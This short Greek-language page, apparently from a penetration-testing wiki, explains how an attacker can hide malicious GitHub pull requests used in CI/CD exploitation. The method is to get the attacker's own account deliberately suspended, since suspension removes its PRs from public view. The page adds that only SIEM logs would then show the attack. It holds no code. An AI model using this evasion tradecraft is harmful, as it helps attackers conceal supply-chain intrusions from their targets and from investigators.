(Technique from [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Πρώτα απ' όλα, οποιοδήποτε PR δημιουργηθεί είναι σαφώς ορατό στο κοινό στο Github και στον στοχευόμενο λογαριασμό GitHub. Στο GitHub εξ ορισμού, **δεν μπορούμε να διαγράψουμε ένα PR από το internet**, αλλά υπάρχει μια ανατροπή. Για λογαριασμούς Github που έχουν **suspended** από το Github, όλα τα **PRs διαγράφονται αυτόματα** και αφαιρούνται από το internet. Έτσι, για να κρύψετε τη δραστηριότητά σας πρέπει είτε να ανασταλεί ο **GitHub account** σας είτε να σημαδευτεί ο λογαριασμός σας. Αυτό θα **κρύψει όλες τις δραστηριότητές σας** στο GitHub από το internet (βασικά θα αφαιρέσει όλα τα exploit PR σας)

Μια οργάνωση στο GitHub είναι πολύ προδραστική στο να αναφέρει λογαριασμούς στο GitHub. Το μόνο που χρειάζεται να κάνετε είναι να μοιραστείτε “κάποια πράγματα” σε ένα Issue και θα φροντίσουν ο λογαριασμός σας να ανασταλεί σε 12 ώρες :p και voilà — το exploit σας γίνεται αόρατο στο github.

> [!WARNING]
> Ο μόνος τρόπος για μια οργάνωση να καταλάβει ότι έχει στοχοποιηθεί είναι να ελέγξει τα GitHub logs από το SIEM, αφού από το GitHub UI το PR θα είχε αφαιρεθεί.

## Αναφορές

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
